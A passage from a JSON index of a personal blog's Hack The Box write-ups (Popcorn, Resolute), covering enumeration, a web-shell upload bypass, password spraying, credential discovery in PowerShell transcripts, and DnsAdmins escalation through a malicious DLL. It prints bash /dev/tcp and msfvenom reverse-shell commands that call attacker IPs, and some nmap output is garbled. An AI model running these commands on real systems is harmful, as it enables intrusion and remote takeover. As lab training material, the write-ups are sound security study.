-p25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 -sC -sV 10.","tags":["HTB","domain-controller","crackmapexec","smbclient","cve-2022-30190","folina","swaks","phishing","hyper-v","bloodhound","addkeycredentiallink","shadow-credentials","whisker","pywhisker","visualstudio","rubeus","sharp-collection","evil-winrm","wsus","sharpwsus","hive-nightmare","secretsdump","pkinittools"],"title":"[HTB] Machine: Outdated"},{"categories":null,"contents":"Popcorn Enumeration nmap └─$ nmap -Pn -p- 10.10.10.6 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 11:54 BST Warning: 10.10.10.6 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.6 (10.10.10.6) Host is up (0.14s latency). Not shown: 65504 closed tcp ports (conn-refused), 29 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.6 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 12:08 BST Nmap scan report for 10.10.10.6 (10.10.10.6) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.2.12 ((Ubuntu)) |_http-server-header: Apache/2.2.12 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web server gobuster └─$ gobuster dir -u http://10.10.10.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.6/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/09/02 12:09:55 Starting gobuster in directory enumeration mode =============================================================== /index (Status: 200) [Size: 177] /test (Status: 200) [Size: 47026] /torrent (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.6/torrent/] /rename (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.6/rename/] Foothold/User Let\u0026rsquo;s check the torrent hoster I will register a user and check if there is something interesting We have Kali Linux image We have an http://10.10.10.6/torrent/upload/ with uploaded images We know from http://10.10.10.6/test That we have file_uploads option on And looks like we can upload files to http://10.10.10.6/torrent/torrents.php?mode=upload We saw http://10.10.10.6/rename endpoint which allows renaming the files The possible path for us is to upload files/image via torrent endpoint and change extension to .php via rename endpoint First we download a correct torrent file since we need to pass the check when uploading the check Now we click edit this torrent Select a image file and click submit screenshot I chose shell.php And it failed with Invalid file error There are 3 ways we can bypass the check: Change Content-Type header Change file extension Set Magic bytes I\u0026rsquo;ll start with header And web shell works Let\u0026rsquo;s get reverse shell bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1' Change \u0026amp; with %26, it should work ?cmd=bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.4/6666 0\u0026gt;%261' If you have weird behavior with shell after upgrading it Try typing reset and type screen for Terminal type? Root george user www-data@popcorn:/var/www$ find / -user george -type f -ls 2\u0026gt;/dev/null 76 4 -rw-r--r-- 1 george george 220 Mar 17 2017 /home/george/.bash_logout 82 4 -rw-r--r-- 1 george george 3180 Mar 17 2017 /home/george/.bashrc 42885 832 -rw-r--r-- 1 george george 848727 Mar 17 2017 /home/george/torrenthoster.zip 42883 0 -rw-r--r-- 1 george george 0 Mar 17 2017 /home/george/.cache/motd.legal-displayed 42884 0 -rw-r--r-- 1 george george 0 Mar 17 2017 /home/george/.sudo_as_admin_successful 2210 4 -rw-r--r-- 1 george george 33 Sep 2 13:53 /home/george/user.txt 107 4 -rw-r--r-- 1 george george 675 Mar 17 2017 /home/george/.profile We see /home/george/.cache/motd.legal-displayed Googling results in https://www.exploit-db.com/exploits/14339 I\u0026rsquo;ll download the script and run it on the box ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/popcorn/images/popcorn.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/popcorn/","summary":"Popcorn Enumeration nmap └─$ nmap -Pn -p- 10.10.10.6 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 11:54 BST Warning: 10.10.10.6 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.6 (10.10.10.6) Host is up (0.14s latency). Not shown: 65504 closed tcp ports (conn-refused), 29 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.6 -T4 Starting Nmap 7.","tags":["HTB","ubuntu","karmic","torrent-hoster","filter","webshell","php","upload","cve-2010-0832","arbitrary-write","passwd","ssh"],"title":"[HTB] Machine: Popcorn"},{"categories":null,"contents":"Resolute Enumeration nmap └─$ nmap -Pn -p- 10.10.10.169 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:49 BST Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 30.27% done; ETC: 16:58 (0:06:20 remaining) Nmap scan report for 10.10.10.169 (10.10.10.169) Host is up (0.16s latency). Not shown: 65511 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49679/tcp open unknown 49684/tcp open unknown 49717/tcp open unknown 50287/tcp open unknown └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.169 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 18:02 BST Nmap scan report for 10.10.10.169 (10.10.10.169) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-04 17:08:39Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsof��λ�U Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2023-09-04T10:08:48-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2023-09-04T17:08:49 |_ start_date: 2023-09-04T15:51:23 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 2h26m23s, deviation: 4h02m30s, median: 6m22s smb └─$ smbclient -N -L //10.10.10.169 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available rpc └─$ rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.169 rpcclient $\u0026gt; querydominfo Domain: MEGABANK Server: Comment: Total Users: 79 Total Groups: 0 Total Aliases: 0 Sequence No: 1 Force Logoff: -1 Domain Server State: 0x1 Server Role: ROLE_DOMAIN_PDC Unknown 3: 0x1 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778] rpcclient $\u0026gt; querydispinfo index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail Name: (null) Desc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: (null) Desc: (null) index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette Name: (null) Desc: (null) index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: (null) Desc: (null) index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: (null) Desc: (null) index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: (null) Desc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null) Desc: A user account managed by the system. index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia Name: (null) Desc: (null) index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null) Desc: (null) index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo Name: (null) Desc: (null) index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) Desc: (null) index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123! index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) Desc: (null) index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) Desc: (null) index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo Name: (null) Desc: (null) index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per Name: (null) Desc: (null) index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan Name: Ryan Bertrand Desc: (null) index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally Name: (null) Desc: (null) index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon Name: (null) Desc: (null) index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve Name: (null) Desc: (null) index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: (null) Desc: (null) index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: (null) Desc: (null) index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf Name: (null) Desc: (null) index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null) Desc: (null) We can also dump information using ldapsearch ldapsearch -H ldap://10.10.10.169 -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; Foothold/User #1 Okay, looks like marco is newly created account with comment Account created. Password set to Welcome123! └─$ crackmapexec smb 10.10.10.169 -u marco -p \u0026#39;Welcome123!\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\marco:Welcome123! STATUS_LOGON_FAILURE We could try password spraying with `Welcome123! It could be that some of the users haven\u0026rsquo;t changed it yet └─$ crackmapexec smb 10.10.10.169 -u users.list -p \u0026#39;Welcome123!\u0026#39; --continue-on-success SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\Administrator:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\Guest:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\krbtgt:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\ryan:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\marko:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\sunita:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\abigail:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\marcus:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\sally:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\fred:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\angela:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\felicia:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\gustavo:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\ulf:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\stevie:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\claire:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\paulo:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\steve:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\annette:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\annika:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\per:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\claude:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\melanie:Welcome123! SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\zach:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\simon:Welcome123! STATUS_LOGON_FAILURE SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\\naoki:Welcome123! STATUS_LOGON_FAILURE We have a hit melanie:Welcome123! Let\u0026rsquo;s try evil-winrm and it works └─$ evil-winrm -i 10.10.10.169 -u melanie -p \u0026#39;Welcome123!\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\melanie\\Documents\u0026gt; User #2 We have another user ryan *Evil-WinRM* PS C:\\\u0026gt; ls -force users Directory: C:\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/25/2019 10:43 AM Administrator d--hsl 7/16/2016 6:28 AM All Users d-rh-- 9/25/2019 10:17 AM Default d--hsl 7/16/2016 6:28 AM Default User d----- 12/4/2019 2:46 AM melanie d-r--- 11/20/2016 6:39 PM Public d----- 9/27/2019 7:05 AM ryan -a-hs- 7/16/2016 6:16 AM 174 desktop.ini Before running winpeas, I will manually check obvious places *Evil-WinRM* PS C:\\\u0026gt; ls -force c:\\ Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d--hs- 12/3/2019 6:40 AM $RECYCLE.BIN d--hsl 9/25/2019 10:17 AM Documents and Settings d----- 9/25/2019 6:19 AM PerfLogs d-r--- 9/25/2019 12:39 PM Program Files d----- 11/20/2016 6:36 PM Program Files (x86) d--h-- 9/25/2019 10:48 AM ProgramData d--h-- 12/3/2019 6:32 AM PSTranscripts d--hs- 9/25/2019 10:17 AM Recovery d--hs- 9/25/2019 6:25 AM System Volume Information d-r--- 12/4/2019 2:46 AM Users d----- 12/4/2019 5:15 AM Windows -arhs- 11/20/2016 5:59 PM 389408 bootmgr -a-hs- 7/16/2016 6:10 AM 1 BOOTNXT -a-hs- 9/4/2023 8:51 AM 402653184 pagefile.sys C:\\PSTranscripts *Evil-WinRM* PS C:\\PSTranscripts\\20191203\u0026gt; ls -force Directory: C:\\PSTranscripts\\20191203 Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt Let\u0026rsquo;s check the content *Evil-WinRM* PS C:\\PSTranscripts\\20191203\u0026gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt ********************** Windows PowerShell transcript start Start time: 20191203063201 Username: MEGABANK\\ryan RunAs User: MEGABANK\\ryan Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0) Host Application: C:\\Windows\\system32\\wsmprovhost.exe -Embedding Process ID: 2800 PSVersion: 5.1.14393.2273 PSEdition: Desktop PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273 BuildVersion: 10.0.14393.2273 CLRVersion: 4.0.30319.42000 WSManStackVersion: 3.0 PSRemotingProtocolVersion: 2.3 SerializationVersion: 1.1.0.1 ********************** Command start time: 20191203063455 ********************** PS\u0026gt;TerminatingError(): \u0026#34;System error.\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Invoke-Expression): \u0026#34;Invoke-Expression\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Invoke-Expression): name=\u0026#34;Command\u0026#34;; value=\u0026#34;-join($id,\u0026#39;PS \u0026#39;,$(whoami),\u0026#39;@\u0026#39;,$env:computername,\u0026#39; \u0026#39;,$((gi $pwd).Name),\u0026#39;\u0026gt; \u0026#39;) if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;Stream\u0026#34;; value=\u0026#34;True\u0026#34; ********************** Command start time: 20191203063455 ********************** PS\u0026gt;ParameterBinding(Out-String): name=\u0026#34;InputObject\u0026#34;; value=\u0026#34;PS megabank\\ryan@RESOLUTE Documents\u0026gt; \u0026#34; PS megabank\\ryan@RESOLUTE Documents\u0026gt; ********************** Command start time: 20191203063515 ********************** PS\u0026gt;CommandInvocation(Invoke-Expression): \u0026#34;Invoke-Expression\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Invoke-Expression): name=\u0026#34;Command\u0026#34;; value=\u0026#34;cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;Stream\u0026#34;; value=\u0026#34;True\u0026#34; ********************** Windows PowerShell transcript start Start time: 20191203063515 Username: MEGABANK\\ryan RunAs User: MEGABANK\\ryan Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0) Host Application: C:\\Windows\\system32\\wsmprovhost.exe -Embedding Process ID: 2800 PSVersion: 5.1.14393.2273 PSEdition: Desktop PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273 BuildVersion: 10.0.14393.2273 CLRVersion: 4.0.30319.42000 WSManStackVersion: 3.0 PSRemotingProtocolVersion: 2.3 SerializationVersion: 1.1.0.1 ********************** ********************** Command start time: 20191203063515 ********************** PS\u0026gt;CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;InputObject\u0026#34;; value=\u0026#34;The syntax of this command is:\u0026#34; cmd : The syntax of this command is: At line:1 char:1 + cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError cmd : The syntax of this command is: At line:1 char:1 + cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError ********************** Windows PowerShell transcript start Start time: 20191203063515 Username: MEGABANK\\ryan RunAs User: MEGABANK\\ryan Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0) Host Application: C:\\Windows\\system32\\wsmprovhost.exe -Embedding Process ID: 2800 PSVersion: 5.1.14393.2273 PSEdition: Desktop PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273 BuildVersion: 10.0.14393.2273 CLRVersion: 4.0.30319.42000 WSManStackVersion: 3.0 PSRemotingProtocolVersion: 2.3 SerializationVersion: 1.1.0.1 ********************** We found creds: ryan:Serv3r4Admin4cc123! If we check ryan groups membership, we see that he can evil-winrm since he\u0026rsquo;s in Contractors group *Evil-WinRM* PS C:\\PSTranscripts\\20191203\u0026gt; net user ryan User name ryan Full Name Ryan Bertrand Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/4/2023 10:36:02 AM Password expires Never Password changeable 9/5/2023 10:36:02 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon Never Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Contractors The command completed successfully. *Evil-WinRM* PS C:\\PSTranscripts\\20191203\u0026gt; net localgroup \u0026#34;Remote Management Users\u0026#34; Alias name Remote Management Users Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. Members ------------------------------------------------------------------------------- Contractors melanie The command completed successfully. Let\u0026rsquo;s connect └─$ evil-winrm -i 10.10.10.169 -u ryan -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; Root ryan\u0026rsquo;s full group membership ryan is a member of DnsAdmins *Evil-WinRM* PS C:\\Users\\ryan\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group MEGABANK\\Contractors Group S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group MEGABANK\\DnsAdmins Alias S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Found a note.txt on ryan\u0026rsquo;s desktop *Evil-WinRM* PS C:\\Users\\ryan\u0026gt; type desktop\\note.txt Email to team: - due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute There is a nice post about privilege escalation from DnsAdmins to System Also https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/ https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin We will use dnscmd First, we generate payload using msfvenom But in my case the payload didn\u0026rsquo;t work, since it can detected by AV So do not upload it to box Or we have an option to build our own dll https://github.com/dim0x69/dns-exe-persistance.git It requires Visual Studio 2017 We also need c++ reverse shell code Watch ippsec\u0026rsquo;s video how to do that └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=6666 -f dll \u0026gt; evil.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 9216 bytes Now we need to register dll We could upload it or share it via smb Start impacket-smbserver Then load evil.dll └─$ impacket-smbserver share $(pwd) -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed *Evil-WinRM* PS C:\\Users\\ryan\u0026gt; dnscmd.exe localhost /config /serverlevelplugindll \\\\10.10.16.5\\share\\evil.dll Registry property serverlevelplugindll successfully reset. Command completed successfully. Next we need restart dns service *Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe stop dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 *Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 1668 FLAGS : If everything is okay, we should receive shell ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/resolute/images/resolute.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/","summary":"Resolute Enumeration nmap └─$ nmap -Pn -p- 10.10.10.169 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:49 BST Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 30.27% done; ETC: 16:58 (0:06:20 remaining) Nmap scan report for 10.10.10.169 (10.10.10.169) Host is up (0.16s latency). Not shown: 65511 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49679/tcp open unknown 49684/tcp open unknown 49717/tcp open unknown 50287/tcp open unknown └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 